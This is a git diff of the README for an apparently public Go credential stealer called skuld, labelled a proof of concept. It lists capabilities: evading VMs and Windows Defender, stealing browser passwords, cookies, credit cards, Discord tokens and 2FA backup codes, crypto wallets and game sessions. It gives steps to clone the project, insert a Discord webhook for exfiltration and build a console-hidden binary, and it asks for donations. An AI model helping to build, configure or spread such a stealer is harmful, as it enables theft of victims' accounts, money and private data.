@@ -58,12 +58,12 @@ This proof of concept project demonstrates a "Discord-oriented" stealer implemen
 - **Anti-debugging Measures:** Detects and exits when running in virtual machines (VMs). 🔍
 - **Antivirus Evasion:** Attempts to disable Windows Defender and block access to antivirus websites. 🦠
 - **System Information Retrieval:** Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more. 🖥️
-- **Chromium-based Browsers Data Theft:** Steals logins, cookies, credit cards, history, and download lists from 36 Chromium-based browsers.
-- **Gecko Browsers Data Theft:** Steals logins, cookies, history, and download lists from 9 Gecko browsers. 🦊
+- **Chromium-based Browsers Data Theft:** Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
+- **Gecko Browsers Data Theft:** Steals logins, cookies, history, and download lists from 10 Gecko browsers. 🦊
 - **Common Files Theft:** Steals sensitive files from common locations. 🗂️
 - **Discord Backup Codes Theft:** Captures Discord Two-Factor Authentication (2FA) backup codes. 🔑
 - **Wallet Data Theft:** Steals data from 10 local wallets and 55 wallet extensions. 💰
-- **Discord Tokens Theft:** Extracts tokens from 4 Discord applications, Chromium, and Gecko browsers.
+- **Discord Tokens Theft:** Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
 - **Games Data Theft:** Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions. 🎮
 - **[Discord Injection:](https://github.com/hackirby/discord-injection)**
   - Intercepts login, register, and 2FA login requests.
@@ -81,14 +81,12 @@ This proof of concept project demonstrates a "Discord-oriented" stealer implemen
 
 ### Prerequisites
 
-- [The Go Programming Language](https://go.dev/)
+* [The Go Programming Language](https://go.dev/dl/)
 
 ### Installation
 To install this project using Git, follow these steps:
 
 - Clone the Repository:
-
-Open your terminal or command prompt and run the following command to clone the repository to your local machine:
 
 ```bash
 git clone https://github.com/hackirby/skuld
@@ -100,21 +98,12 @@ cd skuld
 ```
 
 - Open `main.go` and edit config with your Discord webhook and your crypto addresses
+![](assets/config.png)
 
-- Build the Project template:
+- Build the Project template: (You can reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)
 
 ```bash
-go build
-```
-
-You can reduce binary size by using these flags
-```bash
-go build -ldflags "-s -w"
-```
-
-and hide the console by using this flag
-```bash
-go build -ldflags "-H=windowsgui"
+go build -ldflags "-s -w -H=windowsgui"
 ```
 
 ## Usage
@@ -131,9 +120,12 @@ func main() {
 }
 ```
 ## Preview
+![](assets/system.png)
 ![](assets/browsers.png)
 ![](assets/token.png)
-![](assets/system.png)
+![](assets/discodes.png)
+![](assets/wallets.png)
+![](assets/games.png)
 ![](assets/codes.png)
 
 ## Roadmap
@@ -147,14 +139,11 @@ func main() {
 I am considering working on these features, but I'm not completely certain yet. However, please feel free to open a pull request to add these features. 
 
 ## Contributing
-Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements.
-
-Please follow the [Contributing Guidelines](https://github.com/hackirby/skuld/blob/main/CONTRIBUTING.md)
+Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Make sure to follow the [Contributing Guidelines](https://github.com/hackirby/skuld/blob/main/CONTRIBUTING.md)
 
 You can also support this project development by leaving a star ⭐ or by donating me. Every little tip helps!
 
-<a href='https://ko-fi.com/hackirby'><img src='https://storage.ko-fi.com/cdn/kofi3.png' width=150></a>
-
+<a href='https://ko-fi.com/hackirby'><img src='assets/kofi.png' width=150></a>
 
 ## License
 This library is released under the MIT License. See LICENSE file for more informations.
